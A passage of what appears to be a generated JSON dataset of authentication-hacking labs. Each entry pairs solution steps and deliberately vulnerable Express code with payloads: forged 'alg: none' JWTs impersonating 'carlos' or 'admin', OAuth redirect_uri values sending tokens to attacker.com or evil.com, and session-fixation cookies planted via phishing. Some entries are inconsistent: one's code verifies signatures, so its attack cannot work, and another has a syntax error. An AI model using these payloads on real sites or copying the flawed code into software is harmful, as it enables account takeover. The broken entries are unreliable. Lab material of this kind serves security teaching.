      "Authorization: Bearer token-for-carlos"
    ]
  }
,
{
    "Lab scenario": "JWT tampering via 'none' algorithm",
    "Lab Description": "This lab implements JWT-based session management using insecure algorithm validation. The application accepts JWTs from authenticated users, but fails to enforce proper signature validation. To solve: Tamper with the JWT to impersonate Carlos and access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request after logging in with a low-privilege account and copy the JWT from the Authorization header.",
      "Send the request to Repeater and decode the JWT using jwt.io or a Burp extension.",
      "Change the 'alg' value in the JWT header to 'none' and modify the payload to set \"username\": \"carlos\".",
      "Remove the JWT signature (everything after the second period) and re-encode the JWT.",
      "Replace the original JWT in the Authorization header with your tampered token and resend the request to access Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') { const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); return res.json({ token }); } res.status(403).send('Invalid login'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const payload = jwt.decode(token); if (payload.username === 'carlos') return res.send('Welcome Carlos!'); res.send('Not Carlos'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  }
,
{
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "This lab's session management is flawed due to predictable session tokens assigned before login. The application issues a session cookie before authentication and fails to regenerate it after successful login. To solve: Fixate a known session on Carlos and reuse it post-login to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept your session when you visit the login page without logging in.",
      "Share your current session token (cookie) with the victim through a crafted phishing link or injection vector.",
      "Simulate the victim logging in using the same session (use curl or Postman with victim’s credentials and your session ID).",
      "After login, use your browser with the fixated session ID to access the My Account page.",
      "Confirm the identity switch and access Carlos’s account to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionid) res.cookie('sessionid', uuid.v4()); res.send('Please log in'); }); app.post('/login', express.urlencoded({ extended: true }), (req, res) => { const { username, password } = req.body; if (users[username] === password) sessions[req.cookies.sessionid] = username; res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionid]; if (user === 'carlos') return res.send('Welcome back, Carlos!'); res.status(403).send('Forbidden'); }); app.listen(4000);",
    "payloads": [
      "Fixated session ID via cookie injection",
      "Set-Cookie: sessionid=known-value",
      "Simulated POST /login with sessionid=known-value and carlos credentials"
    ]
  }
,
{
    "Lab scenario": "OAuth implicit flow redirect URI manipulation",
    "Lab Description": "This lab uses OAuth 2.0 implicit flow, but its redirect URI validation is poorly implemented. The redirect URI can be manipulated to leak the access token to an attacker-controlled domain. To solve: Steal Carlos’s access token using an open redirect and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp to intercept the OAuth flow when logging in and observe the redirect_uri parameter.",
      "Craft a redirect_uri pointing to an attacker-controlled domain, like https://attacker.com#access_token=",
      "Send the manipulated login link to Carlos (or simulate clicking it with Carlos’s session).",
      "Capture the leaked token on your server by checking access logs or using a webhook endpoint.",
      "Use the stolen token in a Bearer Authorization header to access /user-profile and retrieve Carlos’s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; if (redirect_uri.includes('http')) { const token = 'carlos-token-abc123'; return res.redirect(`${redirect_uri}#access_token=${token}`); } res.status(400).send('Invalid redirect URI'); }); app.get('/user-profile', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-token-abc123') return res.send('Profile: Carlos'); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com",
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/#access_token=",
      "Authorization: Bearer carlos-token-abc123"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion leading to authentication bypass",
    "Lab Description": "The authentication mechanism uses JSON Web Tokens (JWTs) for session management. However, it fails to verify the signing algorithm properly, allowing an attacker to forge tokens by switching the algorithm to 'none'. The application accepts unsigned JWTs if the alg field is tampered. To solve: forge a valid token and access Carlos's account page without valid credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login response and capture the JWT in the Set-Cookie header.",
      "2. Decode the JWT using jwt.io or Postman and analyze the alg field.",
      "3. Modify the alg value from HS256 to none and delete the signature part of the token.",
      "4. Change the payload sub field to 'carlos', re-encode the JWT without signing it.",
      "5. Replace the original JWT in the request cookies with the modified unsigned JWT and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'carlos123' }]; const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ sub: username }, SECRET, { algorithm: 'HS256' }); res.cookie('auth', token); res.send('Login successful'); }); app.get('/my-account', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, SECRET); res.send(`Account page of ${decoded.sub}`); } catch (err) { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Auth Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration",
    "Lab Description": "The lab uses OAuth 2.0's implicit flow to authorize users but fails to validate the redirect URI correctly. This enables an attacker to steal tokens by redirecting users to an attacker-controlled domain. To solve: harvest a valid access token and use it to impersonate Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the /authorize request using Burp Suite or OWASP ZAP.",
      "2. Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/callback).",
      "3. Craft a phishing link containing the modified redirect_uri and trick Carlos into clicking it.",
      "4. Capture the access token from the fragment portion of the redirect URL sent to your server.",
      "5. Use the stolen token in the Authorization header (Bearer token) to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const crypto = require('crypto'); const users = [{ username: 'carlos', password: 'secure123', token: 'access_token_carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (response_type === 'token') { const token = 'access_token_carlos'; const uri = `${redirect_uri}#access_token=${token}&token_type=bearer`; res.redirect(uri); } else { res.status(400).send('Invalid response_type'); } }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = users.find(u => u.token === token); if (user) res.send(`Welcome ${user.username}`); else res.status(401).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Flow Lab at http://localhost:${PORT}`));",
    "payloads": [
      "https://vulnerable-app.com/authorize?client_id=123&redirect_uri=https://attacker.com/callback&response_type=token",
      "https://attacker.com/callback#access_token=access_token_carlos&token_type=bearer"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID",
    "Lab Description": "The application issues session cookies before authentication and does not regenerate the session ID after login. An attacker can set a known session ID for a victim, then hijack the session post-login. To solve: fixate Carlos's session and use it after he logs in.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Postman or Burp Suite, initiate a session by sending a GET request to /login and note the Set-Cookie header.",
      "2. Share the fixed session ID with the victim (e.g., in a phishing email or malicious link).",
      "3. Wait for the victim to log in with the fixated session ID.",
      "4. Use the same session ID to access /my-account while impersonating Carlos.",
      "5. Confirm access to his account to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'mypassword' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || 'abc123'; sessions[sid] = {}; res.cookie('sid', sid); res.send('<form method=post action=/login><input name=username><input name=password><input type=submit></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.send('Invalid login'); const sid = req.cookies.sid; sessions[sid] = { user: username }; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sessions[sid] && sessions[sid].user) res.send(`Welcome ${sessions[sid].user}`); else res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=abc123",
      "GET /login HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123",
      "GET /my-account HTTP/1.1\nHost: vulnerable-app.com\nCookie: sid=abc123"
    ]
  }
  ,
  {
    "Lab scenario": "JWT algorithm confusion attack in stateless API authentication",
    "Lab Description": "This lab's stateless JWT-based authentication system is vulnerable to an algorithm confusion flaw. The server uses RS256 for verifying JWTs, but it accepts tokens signed with HS256 if manipulated correctly. The application blindly trusts the 'alg' field in the JWT header. To solve: forge a valid JWT that grants access to Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a JWT issued to a valid user via login API.",
      "Decode the JWT using jwt.io or jwt-tool and analyze the header and payload for algorithm type and key fields.",
      "Change the algorithm from RS256 to HS256 and set the payload 'username' to 'carlos'.",
      "Use the public key as HMAC secret and sign the token using HS256 with jwt_tool or python-jose.",
      "Send the forged JWT via Authorization header to /my-account endpoint and verify access to Carlos's page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; const pubKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, fs.readFileSync('./private.pem'), { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.username === 'carlos') res.send('Sensitive info for Carlos'); else res.send('Access denied'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "HS256 JWT with payload: {\"username\":\"carlos\"}, signed using RS public key",
      "Modified header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Signed using HMAC with public key as secret"
    ]
  }
,
{
    "Lab scenario": "Session fixation in classic web login flow",
    "Lab Description": "The application fails to invalidate the user's session upon successful login, making it vulnerable to session fixation. The attacker can set a session identifier before the victim logs in, and the application continues using the same session after authentication. To solve: Fix a session ID, trick Carlos to log in, and then use the session ID to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to initiate a session with GET /login and capture the Set-Cookie header.",
      "Send the session cookie to Carlos via social engineering or simulate login with known credentials using the fixed session ID.",
      "Ensure that the application does not issue a new session ID post-login by observing response cookies.",
      "Reuse the fixed session ID and send a request to /my-account with the session cookie set.",
      "Verify access to Carlos's account page using the same session identifier."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: false })); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.setHeader('Set-Cookie', 'session=' + sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = { authenticated: true, username }; res.redirect('/my-account'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session?.authenticated && session.username === 'carlos') { res.send('Carlos's account'); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "Fixed session ID like 'attacker123' set via Set-Cookie header",
      "Crafted POST /login request with known user credentials and fixed session cookie",
      "GET /my-account with same session ID reused after victim login"
    ]
  }
  ,
  {
    "Lab scenario": "OAuth misconfiguration leaking tokens via redirect",
    "Lab Description": "The OAuth implementation of this app leaks access tokens via an open redirect vulnerability after authorization. The redirect_uri parameter is not properly validated, allowing attackers to capture tokens sent via URL fragments. To solve: Trick the authorization server into sending Carlos's token to your controlled endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Start OAuth authorization flow with Burp and intercept the GET /authorize request.",
      "Modify the redirect_uri parameter to an attacker-controlled domain or path (e.g., https://attacker.com/callback).",
      "Trick Carlos into authorizing the app by sending the crafted link.",
      "Capture the access token in the redirect fragment sent to your endpoint (e.g., #access_token=abc123).",
      "Use the stolen token in the Authorization header to access the protected /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = {}; app.get('/authorize', (req, res) => { const { redirect_uri, user } = req.query; const token = 'token_' + Math.random().toString(36).substring(2); tokens[user] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const user = Object.keys(tokens).find(u => `Bearer ${tokens[u]}` === auth); if (user === 'carlos') res.send('Carlos account data'); else res.status(401).send('Unauthorized'); }); app.listen(8080);",
    "payloads": [
      "Modified redirect_uri=https://attacker.com/callback",
      "OAuth URL: /authorize?redirect_uri=https://attacker.com/callback&user=carlos",
      "Authorization header: Bearer token_xxxxxx"
    ]
  }
,
{
    "Lab scenario": "JWT algorithm confusion in login authentication",
    "Lab Description": "The application uses JWTs to manage user sessions. However, it improperly trusts the 'alg' field from user-supplied tokens without validating the signature. The application accepts tokens where 'alg' is set to 'none'. To solve: forge a valid token for the admin user and access the protected admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture the POST /login request and extract the JWT from the Set-Cookie header.",
      "2. Decode the JWT at jwt.io and observe the header and payload fields.",
      "3. Modify the header to use 'alg':'none' and change the payload to 'username':'admin'.",
      "4. Remove the signature part entirely and send the modified JWT in the Cookie header using Postman or Burp.",
      "5. Access /admin-dashboard and verify admin privileges."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.cookie('session', token).send('Logged in'); }); app.get('/admin-dashboard', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') { return res.send('Welcome admin!'); } res.send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{ \"alg\": \"none\" }.{ \"username\": \"admin\" }."
    ]
  }
,
{
    "Lab scenario": "Open redirect flaw in OAuth redirect_uri parameter",
    "Lab Description": "This lab implements OAuth login flow using a third-party provider. The `redirect_uri` parameter is improperly validated, allowing redirection to arbitrary domains. To solve: intercept the OAuth flow and steal an access token via redirection to a malicious endpoint under your control.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Initiate the login with OAuth from the target app and intercept the initial authorization URL using Burp Suite.",
      "2. Modify the 'redirect_uri' parameter to redirect to your malicious host (e.g., https://evil.com/callback).",
      "3. Host a listener or server on https://evil.com to capture the incoming request with the access_token.",
      "4. Complete the flow and monitor your server logs for the leaked token.",
      "5. Replay the token in an authenticated API request using Postman to retrieve the user profile and access restricted data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}?access_token=1234567890abcdef`); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === '1234567890abcdef') return res.send('User profile: admin'); res.status(403).send('Forbidden'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirection Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "https://evil.com/callback",
      "https://malicious.site/steal?access_token=1234567890abcdef",
      "redirect_uri=https://attacker.com/receive"
    ]
  }
,
{
    "Lab scenario": "Session fixation vulnerability in authentication process",
    "Lab Description": "The login endpoint does not issue a new session identifier after successful authentication. This allows an attacker to fix a session ID before login and hijack the user session afterward. To solve: fix a session ID, get the victim to log in using it, then access their account using the same session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to visit the site and note the session cookie issued before login (e.g., session=abcd1234).",
      "2. Send this session ID to the victim and entice them to log in while using it (via a phishing link or XSS vector).",
      "3. Once the victim logs in with the fixed session ID, reuse it to access /my-account.",
      "4. Verify you now have access to their authenticated session.",
      "5. Visit /my-account while reusing the session cookie and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const session = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[session] = username; return res.send('Login successful'); } res.status(401).send('Login failed'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) return res.send(`Account page for ${user}`); res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "session=abcd1234",
      "GET /login with predefined cookie",
      "Cookie: session=abcd1234"
    ]
  }
,
{
    "Lab scenario": "Session fixation via MFA token reuse in REST login flow",
    "Lab Description": "The application uses a RESTful login flow with 2FA implemented through a token verification endpoint. However, the token is bound to the session in an insecure way. The application reuses the 2FA token without revalidating the session context, allowing an attacker to hijack a victim's session post-authentication. To solve: Fixate your session during pre-authentication and inject a valid 2FA token generated by the victim to gain access to their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite's Proxy to log in with your own credentials and intercept the POST /api/generate-2fa-token request.",
      "Send the 2FA generation request to Repeater, change the 'username' field to 'carlos' and capture the valid token.",
      "Start a new session using incognito mode and intercept the pre-login request to POST /api/session.",
      "Send the session cookie along with the stolen 2FA token to the POST /api/verify-2fa endpoint.",
      "Upon successful response, access /api/user-profile using the fixed session to verify account takeover."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const sessions = {}; const tokens = {}; app.use(bodyParser.json()); app.post('/api/session', (req, res) => { const sid = 'sess_' + Date.now(); sessions[sid] = { authenticated: false }; res.cookie('session', sid).json({ sid }); }); app.post('/api/generate-2fa-token', (req, res) => { const { username } = req.body; tokens[username] = '112233'; res.json({ message: 'Token sent' }); }); app.post('/api/verify-2fa', (req, res) => { const sid = req.cookies.session; const { username, token } = req.body; if (tokens[username] === token) { sessions[sid].authenticated = true; sessions[sid].user = username; return res.json({ success: true }); } res.status(403).json({ error: 'Invalid token' }); }); app.get('/api/user-profile', (req, res) => { const sid = req.cookies.session; if (sessions[sid]?.authenticated) return res.send('Welcome ' + sessions[sid].user); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "{\"username\":\"carlos\"}",
      "{\"username\":\"carlos\",\"token\":\"112233\"}"
    ]
  }
,
{
    "Lab scenario": "OAuth implicit flow token theft via redirect URI manipulation",
    "Lab Description": "The application integrates with a third-party OAuth provider using the implicit flow, but does not properly validate redirect URIs. This allows an attacker to inject a malicious redirection target and capture the access token from the URL fragment. To solve: Exploit the OAuth flow to extract Carlos’s access token and use it to access his private user dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the login link to the OAuth provider and intercept the OAuth authorization request.",
      "Modify the redirect_uri parameter to point to your own server or Burp Collaborator.",
      "Trigger the OAuth login flow using Carlos’s session (use session fixation or phishing).",
      "Capture the access token leaked in the URL fragment via your redirect URI endpoint.",
      "Replay the token in the Authorization header to access the victim's /dashboard endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); const tokenCache = {}; app.use(bodyParser.urlencoded({ extended: true })); app.get('/auth', (req, res) => { const { redirect_uri, user } = req.query; const token = Buffer.from(user + ':token123').toString('base64'); tokenCache[user] = token; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/dashboard', (req, res) => { const auth = req.headers['authorization']; const token = auth?.split(' ')[1]; const decoded = Buffer.from(token, 'base64').toString(); const username = decoded.split(':')[0]; if (tokenCache[username] === token) return res.send('Dashboard for ' + username); res.status(403).send('Access denied'); }); app.listen(4001);",
    "payloads": [
      "https://malicious.example.com/#access_token=carlos:token123",
      "Authorization: Bearer Y2FybG9zOnRva2VuMTIz"
    ]
  }
,
{
    "Lab scenario": "JWT signature validation bypass using 'none' algorithm",
    "Lab Description": "The application uses JWT for session management. However, it incorrectly accepts tokens with the 'alg':'none' header and skips signature verification. An attacker can forge a token and impersonate any user. To solve: Create a tampered token that impersonates the admin user and access the protected admin panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a GET /jwt-login request and extract your valid JWT.",
      "Decode the JWT using jwt.io or Burp Decoder and note the structure.",
      "Craft a new token with header: {\"alg\":\"none\"}, and payload: {\"user\":\"admin\"}. Remove the signature.",
      "Send the forged token in Authorization: Bearer header to /admin-dashboard.",
      "Confirm admin access and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.get('/jwt-login', (req, res) => { const token = jwt.sign({ user: 'guest' }, secret); res.send({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader?.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.user === 'admin') return res.send('Welcome Admin'); res.status(403).send('Not authorized'); } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4002);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    ]
  }
  
]